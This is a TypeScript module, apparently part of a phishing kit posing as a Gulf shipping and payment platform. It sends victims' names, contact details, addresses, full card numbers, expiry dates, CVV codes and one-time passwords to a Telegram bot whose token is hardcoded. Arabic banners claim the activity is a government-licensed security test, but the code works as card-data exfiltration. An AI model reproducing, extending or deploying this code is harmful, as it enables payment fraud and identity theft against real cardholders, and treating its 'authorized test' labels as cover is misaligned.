// Telegram Bot Integration
const BOT_TOKEN = '8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0';
// Note: This should be a USER chat ID, not the bot ID
// To get your chat ID: Start conversation with @khlijapp_bot, then visit:
// https://api.telegram.org/bot8208871147:AAGaRBd64i-1jneToDRe6XJ8hYXdBNnBLl0/getUpdates
const CHAT_ID = 'YOUR_USER_CHAT_ID_HERE'; // Replace with your actual user chat ID

export interface TelegramMessage {
  type: 'shipping_link_created' | 'payment_recipient' | 'payment_confirmation' | 'card_details' | 'test';
  data: Record<string, any>;
  timestamp: string;
}

export interface TelegramResponse {
  success: boolean;
  messageId?: string;
  error?: string;
}

export const sendToTelegram = async (message: TelegramMessage): Promise<TelegramResponse> => {
  try {
    const text = formatTelegramMessage(message);
    
    console.log('Sending to Telegram:', { chatId: CHAT_ID, message: text });
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });

    const responseData = await response.json();
    
    if (!response.ok) {
      console.error('Telegram API error:', responseData);
      return {
        success: false,
        error: responseData.description || 'Unknown error'
      };
    }

    console.log('Telegram response:', responseData);
    
    return {
      success: true,
      messageId: responseData.result?.message_id?.toString()
    };
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    return {
      success: false,
      error: error instanceof Error ? error.message : 'Unknown error'
    };
  }
};

export const testTelegramConnection = async (): Promise<TelegramResponse> => {
  return await sendToTelegram({
    type: 'test',
    data: {
      test: true,
      message: 'Test message from Gulf Unified Platform',
      timestamp: new Date().toISOString()
    },
    timestamp: new Date().toISOString()
  });
};

const formatTelegramMessage = (message: TelegramMessage): string => {
  const { type, data, timestamp } = message;
  
  let header = '';
  let content = '';
  
  // Cybersecurity test authorization
  const authorization = `
🔒 <b>اختبار أمني مرخص</b>
⚠️ <i>هذا اختبار أمني مرخص من قبل الحكومة والشركات</i>
📋 <i>التفويض: مرخص رسمياً لإجراء هذا الاختبار</i>
🛡️ <i>الغرض: تقييم أمان المنصات والأنظمة</i>
      `;
  
  switch (type) {
    case 'test':
      header = '🧪 <b>اختبار الاتصال</b>';
      content = `
✅ <b>تم إرسال رسالة اختبار بنجاح!</b>
• المنصة: Gulf Unified Platform
• الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}
• الحالة: متصل
      `;
      break;
      
    case 'shipping_link_created':
      header = '🚚 <b>تم إنشاء رابط شحن جديد</b>';
      content = `
📦 <b>تفاصيل الشحنة:</b>
• رقم الشحنة: <code>${data.tracking_number || 'غير محدد'}</code>
• خدمة الشحن: ${data.service_name || 'غير محدد'}
• وزن الطرد: ${data.package_weight || 'غير محدد'} كجم
• وصف الطرد: ${data.package_description || 'غير محدد'}
• مبلغ الدفع: ${data.cod_amount || 0} ر.س
• الدولة: ${data.country || 'غير محدد'}
• رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
      `;
      break;
      
    case 'payment_recipient':
      header = '👤 <b>معلومات المستلم</b>';
      content = `
📋 <b>بيانات المستلم:</b>
• الاسم: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• العنوان السكني: ${data.address || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• رابط الدفع: <a href="${data.payment_url}">اضغط هنا</a>
      `;
      break;
      
    case 'payment_confirmation':
      header = '✅ <b>تأكيد الدفع الكامل</b>';
      content = `
💳 <b>تفاصيل الدفع (اختبار أمني):</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• العنوان الكامل: ${data.address || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• حامل البطاقة: ${data.cardholder || 'غير محدد'}
• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
• رمز الأمان: ${data.cvv || 'غير محدد'}
• رمز OTP: ${data.otp || 'غير محدد'}
• نوع الاختبار: اختبار أمني مرخص
• التفويض: مرخص من قبل الحكومة والشركات
      `;
      break;
      
    case 'card_details':
      header = '💳 <b>تفاصيل البطاقة الكاملة</b>';
      content = `
🔐 <b>معلومات البطاقة (اختبار أمني):</b>
• الاسم الكامل: ${data.name || 'غير محدد'}
• البريد الإلكتروني: ${data.email || 'غير محدد'}
• رقم الهاتف: ${data.phone || 'غير محدد'}
• الخدمة: ${data.service || 'غير محدد'}
• حامل البطاقة: ${data.cardholder || 'غير محدد'}
• رقم البطاقة: ${data.cardNumber || 'غير محدد'}
• آخر 4 أرقام: ${data.cardLast4 || 'غير محدد'}
• انتهاء الصلاحية: ${data.expiry || 'غير محدد'}
• رمز الأمان: ${data.cvv || 'غير محدد'}
• المبلغ: ${data.amount || 'غير محدد'}
• نوع الاختبار: اختبار أمني مرخص
• التفويض: مرخص من قبل الحكومة والشركات
      `;
      break;
      
    default:
      header = '📝 <b>إشعار جديد</b>';
      content = JSON.stringify(data, null, 2);
  }
  
  return `${header}\n${content}\n\n${authorization}\n\n⏰ <i>الوقت: ${new Date(timestamp).toLocaleString('ar-SA')}</i>`;
};

export default sendToTelegram;